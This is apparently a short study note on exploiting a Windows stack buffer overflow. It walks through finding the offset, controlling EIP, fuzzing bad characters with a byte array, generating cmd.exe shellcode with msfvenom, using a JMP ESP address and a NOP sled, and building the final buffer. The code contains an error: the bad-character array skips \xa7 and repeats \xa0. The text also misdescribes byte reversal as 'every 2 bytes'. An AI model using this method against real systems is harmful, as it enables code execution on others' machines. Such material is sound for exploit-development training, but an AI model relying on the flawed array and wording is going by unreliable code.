# Windows Buffer Overflow

First, create a payload that will 100% overflow the buffer. It could be either generated with msfvenom or with continous "A"s. I prefer the A's because it guarantees no bad characters in case the program filters those out.&#x20;

Then, start to binary search or just search for the offset that will just overflow the buffer. Then, try to control EIP with `b'\xef\xbe\xad\xde'` and see if Immunity Debugger shows it. If it does, we can move on.

I will set an offset of `b'\x43'*4`, which isn't completely necessary but is helpful. Now, I can start fuzzing for bad characters.

```
badchars = b""
badchars+=b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
badchars+=b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchars+=b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
badchars+=b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
badchars+=b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
badchars+=b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
badchars+=b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
badchars+=b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
badchars+=b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
badchars+=b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
badchars+=b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa8\xa9\xa0\xaa\xab\xac\xad\xae\xaf"
badchars+=b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
badchars+=b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
badchars+=b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
badchars+=b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
badchars+=b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

Remove x00 by default and probably x0a, and then look where the string of where it terminates to remove that bad character.

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

You can see that after 0x09, the string of bytes terminates, so you can conclude that 0x0a is a bad character. Once you eliminate all of those, you can move onto shellcode.

```
msfvenom -a x86 --platform Windows -p windows/exec CMD="cmd.exe" -f py -b "\x00\x0a\x73\x95\xba\xf7" -v shellcode 
```

Paste this into your program. Also, we will need to find EIP. This just means to find a JMP ESP instruction, which could be at 0x148011b6, and then reverse every 2 bytes to get `eip = b'\xb6\x11\x80\x14'` Now we can add a NOP sled with `nops = b"\x90" * 10` and then create our final buffer.

```
inputBuffer = filler + eip + offset + nops + shellcode
```

And you are complete.
